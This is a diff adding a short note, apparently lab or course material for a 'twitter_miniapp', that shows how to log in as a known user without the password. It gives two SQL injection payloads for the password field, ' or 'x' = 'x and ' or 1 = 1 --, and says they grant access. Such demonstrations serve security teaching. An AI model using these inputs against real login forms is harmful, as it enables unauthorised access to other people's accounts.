@@ -1,0 +1,12 @@
+For the twitter_miniapp, suppose an attacker knows a victim's email, but doesn't know the password.
+
+The attacker can enter the following log in inputs:
+email: test@test.com
+password: ' or 'x' = 'x
+
+or
+
+email: test@test.com
+password: ' or 1 = 1 -- (white spaces are important)
+
+Try it out and you can see that you are logged in without the correct password.
